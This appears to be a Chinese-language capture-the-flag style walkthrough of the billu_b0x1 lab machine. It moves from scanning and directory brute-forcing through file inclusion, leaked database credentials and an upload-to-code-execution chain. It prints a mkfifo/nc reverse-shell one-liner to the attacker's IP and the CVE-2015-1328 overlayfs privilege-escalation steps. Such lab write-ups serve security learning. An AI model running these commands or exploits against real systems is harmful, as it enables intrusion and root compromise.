[TOC]



# 前言

靶机：`billu_b0x1`靶机，IP地址为`192.168.10.10`

攻击：`kali`，IP地址为`192.168.10.6`

靶机和攻击机都采用`VMware`虚拟机，都采用桥接网卡模式

> 文章涉及的靶机及工具，都可以自行访问官网或者项目地址进行获取，或者通过网盘链接下载   `https://pan.quark.cn/s/c524477461b0`

# 主机发现

也就是相当于现实环境中去发现确定主机的`ip`地址，因为这里是靶机环境，所以跳过了从域名到`ip`地址的过程。

使用`arp-scan -l`或者`netdiscovery -r 192.168.10.1/24`

当然也可以使用`nmap`等工具进行

```shell
arp-scan -l
```

![](./pic-1/1.jpg)

# 信息收集

## 使用nmap扫描目标端口等信息

首先扫描目标的`tcp`端口的开放情况

```shell
nmap -sT --min-rate=1000 192.168.10.10 -p- -oA nmap-tcp
```

![](./pic-1/2.jpg)

再扫描`udp`端口的开放情况

```shell
nmap -sU --min-rate=1000 192.168.10.10 --top-ports 20 -oA nmap-udp
```

![](./pic-1/3.jpg)

可以看到明确开放的`udp`端口没有，所以下面对`tcp`端口进行一个筛选

```shell
ports=`grep open nmap-tcp.nmap | awk -F'/' '{print $1}' | paste -sd ','`
```

![](./pic-1/4.jpg)

进一步对这些端口进行服务、系统等探测

```shell
nmap -sV -O -sC 192.168.10.10 -p $ports --min-rate=1000 -oA detail
```

![](./pic-1/5.jpg)

再使用`nmap`的漏洞检测脚本对这些端口进行探测

```shell
nmap --script=vuln 192.168.10.10 -p $ports -oA vuln
```

![](./pic-1/6.jpg)

## 网站信息探测

访问80端口的默认界面，可以看到有登录框，并且提示说展示你的`sql`注入技术

![](./pic-1/7.jpg)

使用`whatweb`或者浏览器插件`wappalyzer`检测配置

![](./pic-1/8.jpg)

使用`gobuster`进行目录爆破，当然还有其他的工具，如`didrb、dirsearch`等

```shell
gobuster dir -u http://192.168.10.10 -w /usr/share/wordlists/dirb/big.txt -b 404 -x php,html,txt,md
```

![](./pic-1/9.jpg)

可以看到多个目录文件，尝试去访问

访问`add.php`，这个与`add`是一样的，可以看到是文件上传

![](./pic-1/10.jpg)

访问`c.php`是一片空白，不知道什么作用

访问`head.php`，是一张图片，说明可能有引用这个图片，说不定采用的是文件包含

![](./pic-1/11.jpg)

访问`in.php`，发现是`phpinfo`界面，这里面有很多信息，要去看哦，我就不截图了

![](./pic-1/12.jpg)

访问`panel.php`发现直接跳转到`index.php`，也就是默认界面

访问`phpmy`，是`phpmyadmin`的管理界面

![](./pic-1/13.jpg)

访问`show.php`是一片空白

访问`test.php`，发现提示缺失参数，不过这个参数是不是`file`就不知道了

![](./pic-1/14.jpg)

访问`uploaded_images`，发现几张图片，是加勒比海盗的图片

![](./pic-1/15.jpg)

查看图片

![](./pic-1/16.jpg)

![](./pic-1/17.jpg)

![](./pic-1/18.jpg)

`ok`，到这里进行信息总结

1. 网站默认界面有登录框，`form`表单，可能存在注入
2. `add.php`具有文件上传，并且`uploaded_images`可能是上传后的路径
3. `test.php`可能存在文件包含，只是参数不确定
4. `phpmy`是`phpmyadmin`管理后台，可能存在弱密码或爆破
5. `uploaded_images`中的三个图片，可能存在隐藏信息

# 漏洞寻找--文件包含利用

首先在主界面尝试进行`sql`注入，构造语句

```shell
un=admin'+or+1=1--+&ps=123&login=let's login
un=admin'&ps=123&login=let's login
un=admin"&ps=123&login=let's login
```

不过测试发现没有任何报错，只有`js`弹窗

![](./pic-1/19.jpg)

尝试把浏览器中的`js`开关关闭，在`firefox`中输入`about:config`，然后搜索`javascript.enabled`关闭即可

![](./pic-1/20.jpg)

这时候再去进行测试，还是不行，没有任何反应



测试`add.php`是否可以上传`php`文件，不过测试后，发现这个`form`表单，没有交给任何文件处理，上传一个`php`文件，没有任何提示，并且`uploaded_images`目录下并没有上传的文件，即使上传的是图片也没有效果



换方向，访问`test.php`，也就是可能存在文件包含的，进行测试

构造链接，以`get`方式进行，但是没有任何响应，说明无果

```shell
ffuf -c -w /usr/share/wordlists/wfuzz/Injections/Traversal.txt -u http://192.168.10.10/test.php?file=FUZZ -fs 72
```

![](./pic-1/21.jpg)

然后使用`burp`抓包，进行下一步，改为`post`模式，因为使用浏览器的`post`提交，会下载文件

在`post`请求体中构造参数和语句`file=/etc/passwd`

![](./pic-1/22.jpg)

这里看到用户`ica`，这里还可以把`linux`一些常用文件的路径都测试一下，这里直接借助`burp`即可，就访问测试之前的几个文件，也就是几个`php`文件，这样可以看到源代码的

在其中的`c.php`文件，发现这竟然是一个配置文件，发现了连接数据库的用户名`billu`和密码`b0x_billu`

![](./pic-1/23.jpg)

那么知道了之后，就直接访问`phpmy`，也就是数据库的网站管理界面。然后在`auth`表中看到了用户名`biLLu`和密码`hEx_it`

![](./pic-1/24.jpg)

以这个用户名和密码登录网站，也就是主页，进行测试，登录后跳转到`panel.php`界面，然后这个图片。啊啊啊啊啊啊啊啊啊啊啊啊啊，梦开始的地方

![](./pic-1/25.jpg)

点击`show users`，发现这里的数据图片就是`uploaded_images`中的图片

![](./pic-1/26.jpg)

# 文件上传漏洞

并且可以添加，也就是文件上传

![](./pic-1/27.jpg)

尝试上传`php`，发现不支持，那么再上传图片，可以，在图片中修改数据，也是可以上传，但是直接访问这个图片是不会被解析的，那么利用之前的`test.php`文件包含一下`panel.php`，看看它的代码

![](./pic-1/28.jpg)

抓取选择时候的数据包，如下

![](./pic-1/29.jpg)

这时候，可以知道，其实文件包含的时候路径什么的都是写好的，只需要图片的路径即可，至于图片的路径，直接右键图片去查看就行了，所以只需要构造下面的`post`请求即可

```shell
load=uploaded_images/get.jpg&continue=continue
```

这个`get.jpg`是在上传图片的基础上所构造的，我这里是直接通过图片添加的。大致如下

![](./pic-1/30.jpg)

下面通过代码执行，这里我采用`hackbar`插件，URL中的`cat`是有的，只是通过页面源代码可以看到

![](./pic-1/31.jpg)

# 反弹shell

通过上面的`php`代码，传参进行反弹shell

```shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.10.6 9999 >/tmp/f
#进行url编码处理
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%20192.168.10.6%209999%20%3E%2Ftmp%2Ff
```

先在`kali`中使用`nc`监听9999端口，然后再执行上面的语句

![](./pic-1/32.jpg)

使用`compgen`查看`python`版本，然后进一步加shell

```shell
compgen -c | gerp python
python -c 'import pty;pty.spawn("/bin/bash")'
```



# CVE-2015-1328内核提权

查看`/home`目录下，发现有`ica`，与前面发现的一样，到该用户的主目录下，并没有什么可查看的

![](./pic-1/33.jpg)



使用`find`寻找具有SUID权限的文件

```shell
find / -perm -4000 -print 2>/dev/null
```

![](./pic-1/34.jpg)

收集内核信息和系统版本，并测试有无`gcc`

```shell
uname -a
uname -r
cat /etc/issue
cat /etc/*release
lsb_release
gcc -v
```

![](./pic-1/35.jpg)

根据这个条件去`kali`使用`searchsploit`搜索

```shell
searchsploit 3.13 ubuntu 12
```

![](./pic-1/36.jpg)

两个，一个是`c`文件脚本，一个是`txt`文件，都是一样的，只不过`txt`文件去解释了漏洞存在的原因，脚本是直接使用

```shell
来自《Documentation/filesystems/overlayfs.txt》[2]：
“非目录对象（文件、符号链接、设备特殊文件等）会根据情况，从上层或下层文件系统中呈现出来。当下层文件系统中的一个文件以需要写入权限的方式被访问时，例如以写入权限打开、更改某些元数据等，该文件会首先从下层文件系统复制到上层文件系统（即‘向上复制’）。”
ovl_copy_up_* 函数没有正确检查用户是否具有将文件写入上层目录的权限。唯一检查的权限是正在被修改的文件的所有者是否有权限写入上层目录。此外，当一个文件从下层目录复制时，文件元数据会被原样复制，而不是将诸如所有者之类的属性更改为触发 copy_up_* 过程的用户。
创建一个属于 root 用户的文件的 1:1 副本的示例：
（请注意，在较旧的内核上不需要 workdir= 选项）

user@...ntu-server-1504:~$ ./create-namespace
root@...ntu-server-1504:~# mount -t overlay -o
lowerdir=/etc,upperdir=upper,workdir=work overlayfs o
root@...ntu-server-1504:~# chmod 777 work/work/
root@...ntu-server-1504:~# cd o
root@...ntu-server-1504:~/o# mv shadow copy_of_shadow
(exit the namespace)
user@...ntu-server-1504:~$ ls -al upper/copy_of_shadow
-rw-r----- 1 root shadow 1236 May 24 15:51 upper/copy_of_shadow
user@...ntu-server-1504:~$ stat upper/copy_of_shadow /etc/shadow|grep Inode
Device: 801h/2049d      Inode: 939791      Links: 1
Device: 801h/2049d      Inode: 277668      Links: 1

现在，我们可以通过将 “upper” 切换为下层目录选项，把这个文件放置到 /etc 目录中。由于该文件归 root 用户所有，并且 root 用户可以写入 /etc 目录，所以权限检查会通过。

user@...ntu-server-1504:~$ ./create-namespace
root@...ntu-server-1504:~# mount -t overlay -o
lowerdir=upper,upperdir=/etc,workdir=work overlayfs o
root@...ntu-server-1504:~# chmod 777 work/work/
root@...ntu-server-1504:~# cd o
root@...ntu-server-1504:~/o# chmod 777 copy_of_shadow
root@...ntu-server-1504:~/o# exit
user@...ntu-server-1504:~$ ls -al /etc/copy_of_shadow
-rwxrwxrwx 1 root shadow 1236 May 24 15:51 /etc/copy_of_shadow

所附的漏洞利用程序通过创建一个所有人可写的 /etc/ld.so.preload 文件来获取 root 权限的 shell。该漏洞利用程序已在 2015 年 6 月 15 日之前的最新内核上，在 Ubuntu 12.04、14.04、14.10 和 15.04 系统上进行了测试。
也有可能列出系统上任何目录的内容，而无需考虑权限问题：

nobody@...ntu-server-1504:~$ ls -al /root
ls: cannot open directory /root: Permission denied
nobody@...ntu-server-1504:~$ mkdir o upper work
nobody@...ntu-server-1504:~$ mount -t overlayfs -o
lowerdir=/root,upperdir=/home/user/upper,workdir=/home/user/work
overlayfs /home/user/o
nobody@...ntu-server-1504:~$ ls -al o 2>/dev/null
total 8
drwxrwxr-x 1 root nogroup 4096 May 24 16:33 .
drwxr-xr-x 8 root nogroup 4096 May 24 16:33 ..
-????????? ? ?    ?          ?            ? .bash_history
-????????? ? ?    ?          ?            ? .bashrc
d????????? ? ?    ?          ?            ? .cache
-????????? ? ?    ?          ?            ? .lesshst
d????????? ? ?    ?          ?            ? linux-3.19.0
```

查看脚本文件

![](./pic-1/37.jpg)

然后通过`python`和`wget`的配合把脚本文件下载到靶机的`/tmp`目录下

![](./pic-1/38.jpg)

然后就是编译脚本

```shell
gcc -o exp 37292.c
chmod +x exp
./exp
```

![](./pic-1/39.jpg)

![](./pic-1/40.jpg)

# 总结

首先理清攻击路线



网站目录扫描--->文件包含`test.php`--->配置文件--->`phpmyadmin`查看数据--->登录网站--->代码审计--->文件上传--->命令执行--->CVE提权

1. 文件包含有妙用，敏感文件可以查看，主要还可以查看相关的代码，以进一步把目标白盒
2. 文件上传的几种绕过方式要知道
3. 提权的CVE原理可以去理解一下
